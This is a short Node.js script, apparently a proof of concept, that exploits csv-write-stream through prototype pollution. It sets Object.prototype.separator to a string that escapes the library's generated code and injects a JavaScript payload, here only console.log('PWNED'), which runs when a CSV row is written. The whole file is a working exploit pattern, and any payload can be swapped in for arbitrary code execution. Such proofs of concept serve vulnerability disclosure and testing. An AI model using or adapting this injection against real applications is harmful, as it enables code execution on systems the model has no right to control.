const fs = require('fs')

const csvWriter = require('csv-write-stream')

const payload = 'console.log("PWNED")';
Object.prototype.separator = `,";${payload};result+="`;

const writer = csvWriter()
writer.pipe(fs.createWriteStream('out.csv'))
writer.write({hello: "world", foo: "bar", baz: "taco"})
writer.end()